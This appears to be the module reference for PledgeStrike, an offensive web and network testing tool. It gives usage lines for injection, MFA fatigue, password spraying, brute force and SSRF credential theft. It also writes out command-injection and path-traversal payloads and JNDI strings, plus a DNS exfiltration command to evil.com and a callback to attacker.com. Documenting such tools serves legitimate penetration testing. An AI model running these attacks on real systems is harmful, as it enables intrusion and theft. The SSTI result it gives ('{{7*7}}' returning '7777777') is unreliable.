# PledgeStrike — Modules Reference

**Last updated:** 2026-08-02

---

## ✅ Ready & Working — Reconnaissance Modules

### 1. CORS — `cors origin`
**Status: READY**

Tests if the server's CORS policy allows cross-origin requests from arbitrary domains.

**How it works:**
Sends HTTP requests with fake `Origin` headers (`https://evil.com`, `https://attacker.test`, `http://localhost`, `null`) and checks the response for `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials` headers.

**How to use:**
```
pledgestrike cors origin --url https://target.com
```

**If a vulnerability exists:**
An attacker can create a malicious website that makes authenticated requests to the target on behalf of a logged-in victim. The attacker's JavaScript can:
- Read the victim's personal data (profile, grades, financial info)
- Perform actions on behalf of the victim (change settings, submit forms)
- Steal session tokens if cookies are sent with the cross-origin request

---

### 2. CSP Analysis — `csp analyze`
**Status: READY**

Fetches and analyzes the `Content-Security-Policy` header to find weaknesses.

**How to use:**
```
pledgestrike csp analyze --url https://target.com
```

---

### 3. Debug Endpoint Scanner — `debug scan`
**Status: READY**

Scans 42+ common debug/admin/info paths to find exposed endpoints.

**How to use:**
```
pledgestrike debug scan --url https://target.com
```

---

### 4. OpenAPI/Swagger Spec Discovery — `openapi spec`
**Status: READY**

**How to use:**
```
pledgestrike openapi spec --url https://target.com
```

---

### 5. Secret Hunter (JS) — `secret js`
**Status: READY**

Scans JavaScript files linked in the page for hardcoded secrets (API keys, tokens, passwords).

**How to use:**
```
pledgestrike secret js --url https://target.com
```

---

### 6. Secret Hunter (Response) — `secret response`
**Status: READY**

Scans HTTP response body for hardcoded secrets (API keys, tokens, passwords).

**How to use:**
```
pledgestrike secret response --url https://target.com
```

---

### 7. Host Header Access Bypass — `host access`
**Status: READY**

**How to use:**
```
pledgestrike host access --url https://target.com
```

---

### 8. Open Redirect Scan — `redirect scan`
**Status: READY**

**How to use:**
```
pledgestrike redirect scan --url https://target.com
```

---

### 9. Subdomain Enumeration — `subdom passive` / `subdom ct`
**Status: READY**

**How to use:**
```
pledgestrike subdom ct --domain target.com
pledgestrike subdom passive --domain target.com
```

---

### 10. WHOIS Lookup — `whois lookup`
**Status: READY (network-dependent)**

**How to use:**
```
pledgestrike whois lookup --url target.com
```

---

### 11. DNS Enumeration — `dnsenum records` / `dnsenum axfr`
**Status: READY (network-dependent)**

**How to use:**
```
pledgestrike dnsenum records --url target.com
pledgestrike dnsenum axfr --url target.com
```

---

## ✅ Ready & Working — Vulnerability Scanners

### 12. SQLi Error-Based — `sqli error`
**Status: READY**

**How to use:**
```
pledgestrike sqli error --url https://target.com/page --param id
```

---

### 13. SQLi Boolean-Based Blind — `sqli blind`
**Status: READY**

**How to use:**
```
pledgestrike sqli blind --url https://target.com/page --param id
```

---

### 14. SQLi Time-Based Blind — `sqli time`
**Status: READY**

**How to use:**
```
pledgestrike sqli time --url https://target.com/page --param id
```

---

### 15. XSS Reflected — `xss reflect`
**Status: READY**

**How to use:**
```
pledgestrike xss reflect --url https://target.com/page --param q
```

---

### 16. CRLF Header Injection — `crlf header`
**Status: READY**

**How to use:**
```
pledgestrike crlf header --url https://target.com --param q
```

---

### 17. Cookie Tampering — `cookie tamper`
**Status: READY**

**How to use:**
```
pledgestrike cookie tamper --url https://target.com
```

---

### 18. Clickjacking — `click frame`
**Status: READY**

Tests for X-Frame-Options header and generates a clickjacking PoC.

**How to use:**
```
pledgestrike click frame --url https://target.com
```

---

### 19. CSRF Token — `csrf token`
**Status: READY**

**How to use:**
```
pledgestrike csrf token --url https://target.com
```

---

### 20. IDOR Test — `idor test`
**Status: READY**

**How to use:**
```
pledgestrike idor test --url https://target.com
```

---

### 21. Session Fixation — `session fixation`
**Status: READY**

**How to use:**
```
pledgestrike session fixation --url https://target.com
```

---

### 22. HTTP Parameter Pollution — `hpp detect`
**Status: READY**

**How to use:**
```
pledgestrike hpp detect --url https://target.com
```

---

### 23. GraphQL Introspection — `graphql-attack introspect`
**Status: READY**

**How to use:**
```
pledgestrike graphql-attack introspect --url https://target.com
```

---

### 24. Spring Boot Actuator — `actuator env`
**Status: READY**

**How to use:**
```
pledgestrike actuator env --url https://target.com
```

---

### 25. CSP Inline Injection — `csp inline`
**Status: READY**

**How to use:**
```
pledgestrike csp inline --url https://target.com --callback https://attacker.com
```

---

### 26. RCE Detection — `rce detect`
**Status: READY**

**How to use:**
```
pledgestrike rce detect --url https://target.com
```

---

### 27. Deserialization Detection — `deser detect`
**Status: READY**

**How to use:**
```
pledgestrike deser detect --url https://target.com
```

---

### 28. postMessage Abuse — `postmsg origin`
**Status: READY**

**How to use:**
```
pledgestrike postmsg origin --url https://target.com
```

---

### 29. Service Worker Poisoning — `sw register`
**Status: READY**

**How to use:**
```
pledgestrike sw register --url https://target.com
```

---

### 30. Unicode Attacks — `unicode homoglyph` / `unicode bidi`
**Status: READY**

**How to use:**
```
pledgestrike unicode homoglyph --url https://target.com
pledgestrike unicode bidi --url https://target.com
```

---

### 31. Parameter Fuzzing — `wfuzz param`
**Status: READY**

**How to use:**
```
pledgestrike wfuzz param --url https://target.com/page
```

---

## ✅ Ready & Working — WAF Detection

### 32. WAF Detector — `waf detect`
**Status: READY (NEW)**

Detects and fingerprints Web Application Firewalls via header analysis and payload probing.

**How it works:**
1. Sends a baseline GET request and records status code, response size, and headers
2. Checks 35+ WAF signature patterns in response headers (Cloudflare, AWS WAF, Akamai, Sucuri, Imperva, F5, FortiWeb, Barracuda, ModSecurity, etc.)
3. Sends 12 malicious payloads (SQLi, XSS, LFI, RCE, CMDi) as URL parameters
4. Compares responses to baseline — if payloads are blocked (403, 406, 429, 501, 503) or cause significant size changes, WAF is detected
5. Calculates confidence level: VERY HIGH (8+ blocked), HIGH (5+), MEDIUM (3+), LOW (1+), NONE (0)

**How to use:**
```
pledgestrike waf detect --url https://target.com
```

**If a WAF is detected:**
- Identifies the WAF vendor from header signatures
- Shows which payload types are blocked
- Reports block status codes used by the WAF
- Suggests WAF bypass techniques may be needed

**If no WAF is detected:**
- All payloads are processed by the backend
- The target is directly exposed to injection attacks
- No filtering layer between attacker and application

---

## ✅ Ready & Working — Exploit Database

### 33. Exploit Lookup (NVD API) — `exploit lookup`
**Status: READY**

**How to use:**
```
pledgestrike exploit lookup -c CVE-2021-44228
```

---

### 34. Exploit Search (NVD API + Local) — `exploit search`
**Status: READY**

**How to use:**
```
pledgestrike exploit search --query log4shell
```

---

## ✅ Ready & Working — Other Modules

### 35. XXE File Read — `xxe file`
**Status: READY**

**How to use:**
```
pledgestrike xxe file --url https://target.com --file /etc/passwd
```

---

### 36. SSRF Probe — `ssrf probe`
**Status: READY (requires URL parameter with {SSRF} placeholder)**

**How to use:**
```
pledgestrike ssrf probe --target "https://target.com/fetch?url={SSRF}"
```

---

## ❌ Known Issues

### 37. TLS Scanner — `tls scan`
**Status: FIXED (timeout added, needs retest)**

Timeout was added to `TcpStream::connect` and TLS read operations to prevent indefinite hangs. The fix has been compiled but not yet tested against a live target.

**How to use:**
```
pledgestrike tls scan --host target.com
```

---

### 38. DNS/WHOIS Modules — `dnsenum` / `whois`
**Status: NETWORK ISSUE**

Both `dnsenum records` and `whois lookup` may fail with "builder error" or "Query failed" depending on the environment's DNS resolver configuration. The modules work correctly in principle but may need a working DNS resolver to function.

---

## ⏳ Untested — Web Application Attack Modules

### 40. Command Injection — `cmdi detect`
**Status: UNTESTED**

Tests for OS command injection via URL parameters. Sends `;id`, `|whoami`, `$(uname -a)` payloads and checks for command output markers (`uid=`, `root:x:0:0`, `Linux`, `Darwin`).

**How to use:**
```
pledgestrike cmdi detect --url https://target.com/page --param cmd
```

**Applicable when:** Target has parameters that might be passed to OS commands (ping utilities, file converters, image processors).

---

### 41. Local File Inclusion — `lfi read`
**Status: UNTESTED**

Tests for LFI via path traversal. Sends `../../../../etc/passwd` payloads at varying depths and checks for file content markers.

**How to use:**
```
pledgestrike lfi read --url https://target.com/page --param file
```

**Applicable when:** Target has file download/path parameters (`?file=`, `?path=`, `?page=`).

---

### 42. NoSQL Injection — `nosqli mongo`
**Status: UNTESTED**

Tests for MongoDB injection via `$where`, `$ne`, `$gt`, `$regex`, `$exists`, `$or`, `$in` operators.

**How to use:**
```
pledgestrike nosqli mongo --url https://target.com/api --param username
```

**Applicable when:** Target uses MongoDB/NoSQL backend (JSON APIs with query operators).

---

### 43. Server-Side Template Injection — `ssti detect`
**Status: UNTESTED**

Tests for SSTI by sending `{{7*7}}` math expressions and checking if the server evaluates them (returns `7777777`).

**How to use:**
```
pledgestrike ssti detect --url https://target.com/page --param name
```

**Applicable when:** Target uses template engines (Jinja2, Twig, FreeMarker, Velocity, Thymeleaf).

---

### 44. HTTP Request Smuggling — `smuggle detect`
**Status: UNTESTED**

Tests for HTTP request smuggling via CL.TE and TE.CL desync attacks between reverse proxy and backend.

**How to use:**
```
pledgestrike smuggle detect --url https://target.com
```

**Applicable when:** Target is behind a reverse proxy (Nginx→backend, HAProxy→backend, AWS ALB→backend).

---

### 45. Padding Oracle — `padoracle detect`
**Status: UNTESTED**

Tests for padding oracle vulnerability by sending different padding variants and checking if the server differentiates between valid/invalid padding.

**How to use:**
```
pledgestrike padoracle detect --url https://target.com --param token
```

**Applicable when:** Target uses CBC-mode encryption with padding (legacy ASP.NET ViewState, old Java crypto).

---

### 46. SSRF Chain (Cloud Metadata) — `ssrf chain`
**Status: UNTESTED**

Escalates SSRF to cloud metadata endpoints (AWS `169.254.169.254`, GCP `metadata.google.internal`, Azure) to extract IAM credentials.

**How to use:**
```
pledgestrike ssrf chain --url https://target.com/fetch?url={SSRF}
```

**Applicable when:** You already found SSRF and the target is hosted on AWS/GCP/Azure.

---

### 47. Race Condition — `race race`
**Status: UNTESTED**

Sends concurrent requests to exploit TOCTOU race conditions (coupon redemption, voting, balance transfers).

**How to use:**
```
pledgestrike race race --url https://target.com/api/redeem --method POST --body '{"code":"FREE"}' --workers 20 --count 100
```

**Applicable when:** Target has concurrent operations (financial transactions, voting, ticket booking, coupon limits).

---

### 48. DNS Rebinding — `rebind attack`
**Status: UNTESTED**

Exploits DNS rebinding to bypass SSRF filters — first resolution returns attacker IP, second returns internal IP.

**How to use:**
```
pledgestrike rebind attack --target https://target.com --interval 5 --count 10
```

**Applicable when:** Target has DNS-based access controls or SSRF protection that validates hostname then connects to IP.

---

### 49. ACL Check — `acl check`
**Status: UNTESTED**

Tests access control lists (AWS S3 bucket policies, cloud IAM permissions).

**How to use:**
```
pledgestrike acl check --url https://target.com
```

**Applicable when:** Target has ACL-protected resources (S3 buckets, cloud storage, IAM-protected APIs).

---

### 50. Payload Generator — `payload gen`
**Status: UNTESTED**

Generates custom polyglot payloads for manual testing.

**How to use:**
```
pledgestrike payload gen --type sqli
```

**Applicable when:** You need custom payloads for manual penetration testing.

---

### 51. API Enumeration — `api enum`
**Status: UNTESTED**

Enumerates undocumented REST/GraphQL API endpoints.

**How to use:**
```
pledgestrike api enum --url https://target.com
```

**Applicable when:** Target exposes REST or GraphQL APIs with potentially undocumented endpoints.

---

## ⏳ Untested — Authentication & Identity Modules

### 52. JWT Analysis — `jwt check/crack/forge/decode`
**Status: UNTESTED**

Tests JWT tokens for weak secrets, alg=none bypass, key confusion, and allows forging new tokens.

**How to use:**
```
pledgestrike jwt decode --token eyJhbGciOiJIUzI1NiIs...
pledgestrike jwt check --token <JWT>
pledgestrike jwt crack --token <JWT> --wordlist rockyou.txt
pledgestrike jwt forge --token <JWT> --claims '{"role":"admin"}'
```

**Applicable when:** Target uses JWT tokens for authentication.

---

### 53. OAuth Redirect Manipulation — `oauth redirect`
**Status: UNTESTED**

Tests OAuth2 redirect URI for manipulation bypasses (open redirect via callback, subdomain takeover).

**How to use:**
```
pledgestrike oauth redirect --auth-url https://target.com/oauth/authorize
```

**Applicable when:** Target uses OAuth2 authentication flow.

---

### 54. MFA Fatigue Bombing — `mfa fatigue`
**Status: UNTESTED**

Sends repeated MFA push notifications to overwhelm a user into approving.

**How to use:**
```
pledgestrike mfa fatigue --url https://target.com/api/mfa --user victim@email.com --count 100 --delay 2
```

**Applicable when:** Target has push-based MFA ( Duo, Okta Verify, Microsoft Authenticator).

---

### 55. SAML XSW — `saml xsw`
**Status: UNTESTED**

Tests SAML XML Signature Wrapping (XSW) attacks and assertion forgery.

**How to use:**
```
pledgestrike saml xsw --url https://target.com/saml/acs
```

**Applicable when:** Target uses SAML SSO (Okta, ADFS, OneLogin, Azure AD SAML).

---

### 56. WebAuthn Origin Confusion — `webauthn origin`
**Status: UNTESTED**

Tests WebAuthn/FIDO2 for origin confusion attacks (subdomain bypass, HTTP downgrade, port variation).

**How to use:**
```
pledgestrike webauthn origin --url https://target.com
```

**Applicable when:** Target uses WebAuthn/FIDO2 for passwordless authentication.

---

### 57. Kerberoasting — `kerb roast`
**Status: UNTESTED**

Requests TGS tickets for SPNs and extracts hashcat-format hashes for offline cracking.

**How to use:**
```
pledgestrike kerb roast --url https://target.com --spn HTTP/web.target.com
```

**Applicable when:** Target is in Active Directory environment with SPNs.

---

### 58. NTLM Relay — `ntlm relay`
**Status: UNTESTED**

Tests for NTLM relay attacks against internal services.

**How to use:**
```
pledgestrike ntlm relay --url https://target.com
```

**Applicable when:** Target uses NTLM authentication (Windows environments, Exchange, SMB).

---

## ⏳ Untested — Infrastructure & Cloud Modules

### 59. Kubernetes Enumeration — `k8s pods`
**Status: UNTESTED**

Enumerates Kubernetes API server for pods, secrets, configmaps, and service accounts.

**How to use:**
```
pledgestrike k8s pods --api-server https://target.com:6443 --token <service-account-token>
```

**Applicable when:** Target exposes Kubernetes API server (`:6443`, `:8443`).

---

### 60. Cloud S3 Enumeration — `cloud s3`
**Status: UNTESTED**

Tests AWS S3 buckets for public read/write access and enumerates contents.

**How to use:**
```
pledgestrike cloud s3 --bucket target-bucket
```

**Applicable when:** Target uses AWS S3 storage with potentially misconfigured bucket policies.

---

### 61. Docker API Escape — `container docker`
**Status: UNTESTED**

Tests exposed Docker API for container enumeration, creation, and potential host escape.

**How to use:**
```
pledgestrike container docker --url http://target.com:2375
```

**Applicable when:** Target exposes Docker API (`:2375` or `:2376`).

---

### 62. CI/CD Pipeline Injection — `cicd inject`
**Status: UNTESTED**

Tests CI/CD pipelines for command injection via PR titles, branch names, commit messages, and workflow triggers.

**How to use:**
```
pledgestrike cicd inject --url https://target.com/api/ci
```

**Applicable when:** Target has CI/CD pipelines (Jenkins, GitHub Actions, GitLab CI, CircleCI).

---

### 63. Supply Chain Typosquatting — `supply typosquat`
**Status: UNTESTED**

Checks package registries for typosquatted dependency names (lodash→lodahs, axios→axois).

**How to use:**
```
pledgestrike supply typosquat --url https://registry.npmjs.org
```

**Applicable when:** Target uses npm/PyPI packages and you want to detect supply chain risks.

---

### 64. Webshell Upload — `shell upload`
**Status: UNTESTED**

Tests file upload functionality for webshell upload bypass (extension filtering, content-type spoofing).

**How to use:**
```
pledgestrike shell upload --url https://target.com/upload
```

**Applicable when:** Target has file upload functionality.

---

### 65. Rate Limit Bypass — `ratelimit check`
**Status: UNTESTED**

Tests if API rate limiting can be bypassed via IP rotation, header manipulation, or parameter pollution.

**How to use:**
```
pledgestrike ratelimit check --url https://target.com/api
```

**Applicable when:** Target has API rate limiting that might be bypassable.

---

### 66. Mass Scanner — `mass scan`
**Status: UNTESTED**

Scans multiple URLs in parallel for fast mass vulnerability detection.

**How to use:**
```
pledgestrike mass scan --urls-file targets.txt
```

**Applicable when:** You need to scan many URLs in parallel.

---

### 67. DNS Exfiltration — `exfil dns`
**Status: UNTESTED**

Tests DNS tunneling for data exfiltration by encoding data into DNS query subdomains.

**How to use:**
```
pledgestrike exfil dns --domain evil.com --data "secret_data_here"
```

**Applicable when:** You have data to exfiltrate and want to test DNS tunneling capability.

---

### 68. HTTP Brute Force — `brute http`
**Status: UNTESTED**

Brute forces HTTP Basic/Form auth with wordlists using concurrent workers.

**How to use:**
```
pledgestrike brute http --url https://target.com/login --users-file users.txt --pass-file passwords.txt --workers 10
```

**Applicable when:** Target has HTTP Basic auth or form-based login without account lockout.

---

### 69. Cache Poisoning — `cache poison`
**Status: UNTESTED**

Tests CDN caching (Cloudflare, Varnish, Fastly) for cache poisoning via header injection.

**How to use:**
```
pledgestrike cache poison --url https://target.com
```

**Applicable when:** Target uses CDN caching layer.

---

### 70. Password Spraying — `spray password`
**Status: UNTESTED**

Password spraying attack — one password, many users — against AD/OWA/Office365.

**How to use:**
```
pledgestrike spray password --url https://target.com/owa --users-file users.txt --password Spring2024!
```

**Applicable when:** Target has Active Directory, OWA, or Office365 with lockout policies that allow few attempts per account.

---

## ⏳ Untested — Protocol-Specific Modules

### 71. Protocol Fingerprinting — `proto enum`
**Status: UNTESTED**

Fingerprints unknown protocols by sending probe packets and analyzing responses.

**How to use:**
```
pledgestrike proto enum --host target.com --port 8080
```

**Applicable when:** Target exposes unknown protocols on non-standard ports.

---

### 72. gRPC Enumeration — `grpc enum`
**Status: UNTESTED**

Enumerates gRPC services and methods via reflection.

**How to use:**
```
pledgestrike grpc enum --url https://target.com:50051
```

**Applicable when:** Target uses gRPC (HTTP/2, port `:50051`).

---

### 73. HTTP/2 Detection — `h2 detect`
**Status: UNTESTED**

Tests for HTTP/2 specific attacks (h2c smuggling, stream multiplexing abuse).

**How to use:**
```
pledgestrike h2 detect --url https://target.com
```

**Applicable when:** Target supports HTTP/2.

---

### 74. WebSocket Testing — `ws connect`
**Status: UNTESTED**

Tests WebSocket endpoints for injection, hijacking, and auth bypass.

**How to use:**
```
pledgestrike ws connect --url wss://target.com/ws
```

**Applicable when:** Target has WebSocket endpoints (chat apps, real-time dashboards, live notifications).

---

### 75. WebDAV Enumeration — `webdav enum`
**Status: UNTESTED**

Tests WebDAV for file upload, MOVE, COPY methods and directory listing.

**How to use:**
```
pledgestrike webdav enum --url https://target.com/webdav
```

**Applicable when:** Target exposes WebDAV (IIS, Apache mod_dav, Nextcloud).

---

### 76. Server-Sent Events Injection — `sse inject`
**Status: UNTESTED**

Tests SSE endpoints for injection attacks.

**How to use:**
```
pledgestrike sse inject --url https://target.com/events
```

**Applicable when:** Target uses Server-Sent Events for real-time updates.

---

### 77. WebAssembly Analysis — `wasm analyze`
**Status: UNTESTED**

Analyzes WebAssembly modules for embedded secrets and vulnerabilities.

**How to use:**
```
pledgestrike wasm analyze --url https://target.com/app.wasm
```

**Applicable when:** Target uses WebAssembly modules.

---

### 78. WebRTC Enumeration — `webrtc enum`
**Status: UNTESTED**

Tests for ICE candidate leaks and WebRTC enumeration.

**How to use:**
```
pledgestrike webrtc enum --url https://target.com
```

**Applicable when:** Target uses WebRTC (video chat, P2P applications).

---

### 79. WSDL/SOAP Enumeration — `wsdl enum`
**Status: UNTESTED**

Enumerates SOAP/WSDL operations and tests for injection.

**How to use:**
```
pledgestrike wsdl enum --url https://target.com/service?wsdl
```

**Applicable when:** Target exposes SOAP/WSDL web services.

---

## ⏳ Untested — Network Protocol Modules (IoT/OT/Infrastructure)

### 80. BLE Scanner — `ble scan`
**Status: UNTESTED**

Scans for Bluetooth Low Energy devices and enumerates services/characteristics.

**How to use:**
```
pledgestrike ble scan
```

**Applicable when:** Target has Bluetooth Low Energy devices (IoT, wearables, beacons).

---

### 81. MQTT Broker — `mqtt connect`
**Status: UNTESTED**

Tests MQTT broker for unauthenticated access and topic enumeration.

**How to use:**
```
pledgestrike mqtt connect --host target.com --port 1883
```

**Applicable when:** Target exposes MQTT broker (`:1883`).

---

### 82. CoAP Enumeration — `coap enum`
**Status: UNTESTED**

Tests CoAP (Constrained Application Protocol) endpoints on IoT devices.

**How to use:**
```
pledgestrike coap enum --host target.com --port 5683
```

**Applicable when:** Target uses CoAP (IoT constrained devices, smart home).

---

### 83. NTP Amplification — `ntp mon`
**Status: UNTESTED**

Tests NTP server for monlist amplification attack potential.

**How to use:**
```
pledgestrike ntp mon --host target.com
```

**Applicable when:** Target exposes NTP service (`:123`).

---

### 84. OT/SCADA Enumeration — `ot enum`
**Status: UNTESTED**

Enumerates Operational Technology/ICS/SCADA systems for exposed services.

**How to use:**
```
pledgestrike ot enum --host target.com
```

**Applicable when:** Target is an OT/ICS/SCADA system (Modbus, DNP3, BACnet).

---

### 85. AMQP Enumeration — `amqp enum`
**Status: UNTESTED**

Tests AMQP/RabbitMQ broker for unauthenticated access.

**How to use:**
```
pledgestrike amqp enum --host target.com --port 5672
```

**Applicable when:** Target exposes AMQP/RabbitMQ (`:5672`).

---

### 86. IPMI Enumeration — `ipmi enum`
**Status: UNTESTED**

Tests IPMI/BMC for auth bypass (CVE-2013-4786) and default credentials.

**How to use:**
```
pledgestrike ipmi enum --host target.com
```

**Applicable when:** Target exposes IPMI/BMC (`:623`) — server management interfaces.

---

### 87. RDP Enumeration — `rdp enum`
**Status: UNTESTED**

Tests RDP for BlueKeep (CVE-2019-0708), weak auth, and information disclosure.

**How to use:**
```
pledgestrike rdp enum --host target.com
```

**Applicable when:** Target exposes RDP (`:3389`).

---

### 88. SMB Enumeration — `smb enum`
**Status: UNTESTED**

Tests SMB for null sessions, share access, and vulnerability scanning.

**How to use:**
```
pledgestrike smb enum --host target.com
```

**Applicable when:** Target exposes SMB (`:445`) — Windows file shares.

---

### 89. SMTP Enumeration — `smtp enum`
**Status: UNTESTED**

Tests SMTP for open relay and user enumeration (VRFY/EXPN/RCPT).

**How to use:**
```
pledgestrike smtp enum --host target.com
```

**Applicable when:** Target exposes SMTP (`:25` or `:587`).

---

### 90. SNMP Enumeration — `snmp enum`
**Status: UNTESTED**

Tests SNMP for default community strings and information disclosure.

**How to use:**
```
pledgestrike snmp enum --host target.com
```

**Applicable when:** Target exposes SNMP (`:161`) — network devices, servers.

---

### 91. SSH Enumeration — `ssh enum`
**Status: UNTESTED**

Tests SSH for weak ciphers, user enumeration, and default credentials.

**How to use:**
```
pledgestrike ssh enum --host target.com
```

**Applicable when:** Target exposes SSH (`:22`).

---

### 92. Redis Enumeration — `redisx enum`
**Status: UNTESTED**

Tests Redis for unauthenticated access and data exposure.

**How to use:**
```
pledgestrike redisx enum --host target.com
```

**Applicable when:** Target exposes Redis (`:6379`).

---

### 93. Elasticsearch Enumeration — `elastic enum`
**Status: UNTESTED**

Tests Elasticsearch for unauthenticated access and data exposure.

**How to use:**
```
pledgestrike elastic enum --host target.com
```

**Applicable when:** Target exposes Elasticsearch (`:9200`).

---

### 94. FTP Anonymous Access — `ftp anon`
**Status: UNTESTED**

Tests FTP for anonymous access and writable directories.

**How to use:**
```
pledgestrike ftp anon --host target.com
```

**Applicable when:** Target exposes FTP (`:21`).

---

### 95. Memcached Enumeration — `memcache enum`
**Status: UNTESTED**

Tests Memcached for unauthenticated access and DDoS amplification potential.

**How to use:**
```
pledgestrike memcache enum --host target.com
```

**Applicable when:** Target exposes Memcached (`:11211`).

---

### 96. MongoDB Enumeration — `mongo enum`
**Status: UNTESTED**

Tests MongoDB for unauthenticated access and data exposure.

**How to use:**
```
pledgestrike mongo enum --host target.com
```

**Applicable when:** Target exposes MongoDB (`:27017`).

---

### 97. VNC Access — `vnc connect`
**Status: UNTESTED**

Tests VNC for unauthenticated access.

**How to use:**
```
pledgestrike vnc connect --host target.com
```

**Applicable when:** Target exposes VNC (`:5900`).

---

### 98. Telnet Access — `telnet connect`
**Status: UNTESTED**

Tests Telnet for default credentials and access.

**How to use:**
```
pledgestrike telnet connect --host target.com
```

**Applicable when:** Target exposes Telnet (`:23`).

---

### 99. SIP/VoIP Enumeration — `sip enum`
**Status: UNTESTED**

Tests SIP/VoIP for toll fraud and user enumeration.

**How to use:**
```
pledgestrike sip enum --host target.com
```

**Applicable when:** Target exposes SIP/VoIP (`:5060`).

---

### 100. RTSP Camera Access — `rtsp enum`
**Status: UNTESTED**

Tests RTSP cameras for unauthenticated stream access.

**How to use:**
```
pledgestrike rtsp enum --host target.com
```

**Applicable when:** Target exposes RTSP (`:554`) — IP cameras, streaming devices.

---

### 101. NFS Enumeration — `nfs enum`
**Status: UNTESTED**

Tests NFS for `no_root_squash` and unauthorized mount access.

**How to use:**
```
pledgestrike nfs enum --host target.com
```

**Applicable when:** Target exposes NFS (`:2049`).

---

### 102. X11 Access — `x11 connect`
**Status: UNTESTED**

Tests X11 for unauthenticated access (keylogging, screenshot).

**How to use:**
```
pledgestrike x11 connect --host target.com
```

**Applicable when:** Target exposes X11 (`:6000`) — Linux desktops.

---

### 103. STOMP Enumeration — `stomp enum`
**Status: UNTESTED**

Tests STOMP messaging endpoints for unauthenticated access.

**How to use:**
```
pledgestrike stomp enum --host target.com
```

**Applicable when:** Target exposes STOMP messaging protocol.

---

### 104. TFTP File Read — `tftp read`
**Status: UNTESTED**

Tests TFTP for unauthorized file read access.

**How to use:**
```
pledgestrike tftp read --host target.com --file /etc/passwd
```

**Applicable when:** Target exposes TFTP (`:69`) — network boot, config backup.

---

### 105. Finger Enumeration — `finger enum`
**Status: UNTESTED**

Tests Finger service for user enumeration.

**How to use:**
```
pledgestrike finger enum --host target.com
```

**Applicable when:** Target exposes Finger (`:79`) — legacy Unix systems.

---

### 106. ZooKeeper Enumeration — `zookeeper enum`
**Status: UNTESTED**

Tests ZooKeeper for unauthenticated access (no auth by default).

**How to use:**
```
pledgestrike zookeeper enum --host target.com
```

**Applicable when:** Target exposes ZooKeeper (`:2181`) — distributed systems coordination.

---

### 107. etcd Enumeration — `etcd enum`
**Status: UNTESTED**

Tests etcd for unauthenticated access (Kubernetes secrets exposure).

**How to use:**
```
pledgestrike etcd enum --host target.com
```

**Applicable when:** Target exposes etcd (`:2379`) — Kubernetes clusters.

---

### 108. UPnP Enumeration — `upnp enum`
**Status: UNTESTED**

Tests UPnP for router exposure and port mapping abuse.

**How to use:**
```
pledgestrike upnp enum --host target.com
```

**Applicable when:** Target exposes UPnP (`:1900`) — routers, IoT devices.

---

### 109. LDAP Enumeration — `ldapi enum`
**Status: UNTESTED**

Tests LDAP for directory enumeration and unauthenticated access.

**How to use:**
```
pledgestrike ldapi enum --host target.com
```

**Applicable when:** Target exposes LDAP (`:389` or `:636`) — Active Directory, OpenLDAP.

---

## ⏳ Untested — Microsoft/Enterprise Modules

### 110. WinRM Enumeration — `winrm enum`
**Status: UNTESTED**

Tests WinRM for remote management access and auth bypass.

**How to use:**
```
pledgestrike winrm enum --host target.com
```

**Applicable when:** Target exposes WinRM (`:5985` or `:5986`) — Windows remote management.

---

### 111. Exchange Enumeration — `exchange enum`
**Status: UNTESTED**

Tests MS Exchange for known CVEs (ProxyLogon, ProxyShell, ProxyNotShell).

**How to use:**
```
pledgestrike exchange enum --url https://target.com
```

**Applicable when:** Target runs Microsoft Exchange (OWA, ECP, autodiscover).

---

### 112. OWA Enumeration — `owa enum`
**Status: UNTESTED**

Tests Outlook Web Access for auth bypass and information disclosure.

**How to use:**
```
pledgestrike owa enum --url https://target.com/owa
```

**Applicable when:** Target has Outlook Web Access.

---

### 113. SharePoint Enumeration — `sharepoint enum`
**Status: UNTESTED**

Tests SharePoint for exposed documents, list items, and misconfigured permissions.

**How to use:**
```
pledgestrike sharepoint enum --url https://target.com
```

**Applicable when:** Target runs Microsoft SharePoint.

---

## ⏳ Untested — Other Modules

### 114. IOC Checker — `ioc check`
**Status: UNTESTED**

Checks indicators of compromise against threat intelligence feeds.

**How to use:**
```
pledgestrike ioc check --hash <file-hash>
pledgestrike ioc check --ip <suspicious-ip>
```

**Applicable when:** You have IOCs to check against threat intel databases.

---

### 115. Agent Mode — `agent run`
**Status: UNTESTED**

Deploys PledgeStrike as a persistent agent for continuous scanning.

**How to use:**
```
pledgestrike agent run --config agent.yaml
```

**Applicable when:** You want persistent/continuous scanning capability.

---

### 116. LLM Analysis — `llm analyze`
**Status: UNTESTED**

Uses AI to analyze scan results and suggest next steps.

**How to use:**
```
pledgestrike llm analyze --results scan_output.json
```

**Applicable when:** You want AI-assisted analysis of scan results.

---

### 117. JNDI Injection — `jndi inject`
**Status: UNTESTED**

Tests for JNDI injection (Log4Shell-style) via `${jndi:ldap://}` and `${jndi:rmi://}` payloads with obfuscation variants.

**How to use:**
```
pledgestrike jndi inject --url https://target.com --param username
```

**Applicable when:** Target uses Java with Log4j, Solr, Struts, or any JNDI lookup functionality.

---

### 118. Web3 Audit — `web3 audit`
**Status: UNTESTED**

Audits smart contracts and Web3 applications for vulnerabilities.

**How to use:**
```
pledgestrike web3 audit --url https://target.com
```

**Applicable when:** Target uses blockchain/Web3 (smart contracts, DeFi, NFT platforms).

---

### 119. Git Exposure — `git enum`
**Status: UNTESTED**

Tests for exposed `.git` directory to dump source code.

**How to use:**
```
pledgestrike git enum --url https://target.com
```

**Applicable when:** Target might have `.git` directory exposed on web root.

---

### 120. Subdomain Takeover — `takeover scan`
**Status: UNTESTED**

Scans for subdomain takeover via dangling CNAME records (decommissioned services).

**How to use:**
```
pledgestrike takeover scan --domains-file subdomains.txt
```

**Applicable when:** Target has subdomains pointing to decommissioned third-party services (GitHub Pages, Heroku, S3, Azure).

---

## Summary Table

| # | Module | Command | Status |
|---|--------|---------|--------|
| 1 | CORS | `cors origin` | ✅ READY |
| 2 | CSP Analysis | `csp analyze` | ✅ READY |
| 3 | Debug Scanner | `debug scan` | ✅ READY |
| 4 | OpenAPI | `openapi spec` | ✅ READY |
| 5 | Secret JS | `secret js` | ✅ READY |
| 6 | Secret Response | `secret response` | ✅ READY |
| 7 | Host Bypass | `host access` | ✅ READY |
| 8 | Open Redirect | `redirect scan` | ✅ READY |
| 9 | Subdom CT | `subdom ct` | ✅ READY |
| 10 | Subdom Passive | `subdom passive` | ✅ READY |
| 11 | WHOIS | `whois lookup` | ✅ READY |
| 12 | DNS Records | `dnsenum records` | ✅ READY |
| 13 | SQLi Error | `sqli error` | ✅ READY |
| 14 | SQLi Blind | `sqli blind` | ✅ READY |
| 15 | SQLi Time | `sqli time` | ✅ READY |
